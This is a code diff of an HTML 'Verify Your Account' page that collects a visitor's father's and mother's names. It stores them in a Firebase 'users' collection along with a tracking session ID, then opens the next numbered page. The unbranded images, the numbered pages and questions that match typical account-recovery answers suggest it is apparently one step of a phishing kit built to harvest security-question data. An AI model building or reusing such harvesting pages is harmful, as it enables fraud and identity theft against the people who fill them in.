@@ -1,93 +1,91 @@
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <title>Home</title>
-    <link rel="stylesheet" href="a02b572693328546.css">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Home</title>
+  <link rel="stylesheet" href="a02b572693328546.css">
 
-    <!-- Firebase SDK -->
-    <script type="module">
-      // Import necessary Firebase modules
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
-      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
 
-      // 🔥 Updated Firebase Configuration
-      const firebaseConfig = {
-        apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
-        authDomain: "ss22-a96d3.firebaseapp.com",
-        projectId: "ss22-a96d3",
-        storageBucket: "ss22-a96d3.firebasestorage.app",
-        messagingSenderId: "607942972170",
-        appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
-        measurementId: "G-KT1P0Q0FD0",
-      };
+    const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.firebasestorage.app",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
+      measurementId: "G-KT1P0Q0FD0",
+    };
 
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      const db = getFirestore(app);
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-      document.addEventListener("DOMContentLoaded", function () {
-        const verifyForm = document.getElementById("verifyForm");
+    document.addEventListener("DOMContentLoaded", function () {
+      const verifyForm = document.getElementById("verifyForm");
 
-        verifyForm.addEventListener("submit", async (event) => {
-          event.preventDefault();
+      verifyForm.addEventListener("submit", async (event) => {
+        event.preventDefault();
 
-          const fatherName = document.getElementById("fatherName").value.trim();
-          const motherName = document.getElementById("motherName").value.trim();
+        const fatherName = document.getElementById("fatherName").value.trim();
+        const motherName = document.getElementById("motherName").value.trim();
 
-          if (!fatherName || !motherName) {
-            alert("Please fill out all required fields.");
-            return;
-          }
+        if (!fatherName || !motherName) {
+          alert("Please fill out all required fields.");
+          return;
+        }
 
-          try {
-            // 🔥 Save user data to Firestore
-            const docRef = await addDoc(collection(db, "users"), {
-              fatherName: fatherName,
-              motherName: motherName,
-              timestamp: serverTimestamp(),
-            });
+        try {
+          const sessionId = localStorage.getItem("sessionId") || null;
 
-            console.log("User data saved successfully with ID:", docRef.id);
+          const docRef = await addDoc(collection(db, "users"), {
+            fatherName: fatherName,
+            motherName: motherName,
+            sessionId: sessionId,
+            timestamp: serverTimestamp(),
+          });
 
-            // 🔥 Open new page in a NEW TAB after successful submission
-            window.open("b11.html", "_blank");
+          console.log("User data saved successfully with ID:", docRef.id);
+          window.open("b11.html", "_blank");
 
-          } catch (error) {
-            console.error("Error saving user data:", error);
-            alert("Error saving data: " + error.message);
-          }
-        });
+        } catch (error) {
+          console.error("Error saving user data:", error);
+          alert("Error saving data: " + error.message);
+        }
       });
-    </script>
-  </head>
-  <body>
-    <div id="__next">
-      <header>
-        <img alt="lo" loading="lazy" width="509" height="99" class="logo" src="logo.png">
-      </header>
-      <main>
-        <form id="verifyForm">
-          <h1>Verify Your Account</h1>
-          <div class="floating-container">
-            <input type="text" id="fatherName" name="fn" placeholder=" " required="">
-            <label>Father's Name <span>*</span></label>
-          </div>
-          <div class="floating-container">
-            <input type="text" id="motherName" name="mn" placeholder=" " required="">
-            <label>Mother's Name <span>*</span></label>
-          </div>
-          <div class="btContainer">
-            <button type="submit">Continue</button>
-          </div>
-        </form>
-      </main>
-      <footer>
-        <div class="l">
-          <img alt="s" loading="lazy" width="1080" height="769" class="l" src="s.jpg">
+    });
+  </script>
+</head>
+<body>
+  <div id="__next">
+    <header>
+      <img alt="lo" loading="lazy" width="509" height="99" class="logo" src="logo.png">
+    </header>
+    <main>
+      <form id="verifyForm">
+        <h1>Verify Your Account</h1>
+        <div class="floating-container">
+          <input type="text" id="fatherName" name="fn" placeholder=" " required="">
+          <label>Father's Name <span>*</span></label>
         </div>
-        <img alt="f" loading="lazy" width="1080" height="189" class="ft" src="ft.png">
-      </footer>
-    </div>
-  
-
-</body></html>
+        <div class="floating-container">
+          <input type="text" id="motherName" name="mn" placeholder=" " required="">
+          <label>Mother's Name <span>*</span></label>
+        </div>
+        <div class="btContainer">
+          <button type="submit">Continue</button>
+        </div>
+      </form>
+    </main>
+    <footer>
+      <div class="l">
+        <img alt="s" loading="lazy" width="1080" height="769" class="l" src="s.jpg">
+      </div>
+      <img alt="f" loading="lazy" width="1080" height="189" class="ft" src="ft.png">
+    </footer>
+  </div>
+</body>
+</html>
